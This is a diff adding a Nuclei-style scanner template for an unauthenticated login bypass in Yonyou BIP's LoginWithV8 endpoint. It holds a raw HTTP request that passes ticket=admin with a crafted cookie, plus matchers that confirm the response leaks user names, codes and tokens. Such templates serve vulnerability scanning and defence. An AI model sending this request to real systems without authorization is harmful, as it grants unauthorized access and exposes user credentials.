@@ -1,0 +1,34 @@
+id: yonyou-bip-LoginWithV8-unauth
+info:
+  name: 用友BIP 数据应用服务 LoginWithV8 存在登录绕过
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/60392/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: yonyou,bip,unauth
+
+http:
+  - raw:
+      - |
+        GET /bi/api/Portal/LoginWithV8/?ticket=admin HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        Cookie: _WorkbenchCross_=Ultraman
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'UserName','UserCode','UserToken','CompanyName')
+        condition: and
